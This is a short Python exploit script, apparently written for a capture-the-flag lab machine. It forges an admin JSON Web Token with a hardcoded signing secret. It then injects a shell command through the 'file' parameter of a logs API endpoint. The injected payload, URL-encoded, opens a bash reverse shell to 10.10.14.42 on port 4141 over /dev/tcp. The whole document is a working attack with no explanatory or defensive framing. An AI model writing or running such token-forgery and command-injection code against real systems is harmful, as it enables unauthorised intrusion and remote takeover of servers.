import json
import jwt
import re
import requests as r
import sys

secret = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'
token = {"auth-token": jwt.encode({"name": "theadmin", "email": "admin@admin.com"},
                                         secret,
                                         algorithm="HS256")}
injection = '%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.42%2F4141+0%3E%261%22' #sys.argv[1]
rspn = r.get(f'http://10.10.11.120:3000/api/logs?file=command;{injection}', headers=token)

try:
    data = json.loads(rspn.text)
    print(data["signal"])
except json.JSONDecodeError:
    print(rspn.text)
except TypeError as e:
    print(re.findall(r'"(.*?)"', rspn.text)[0].encode('utf-8').decode('unicode_escape'))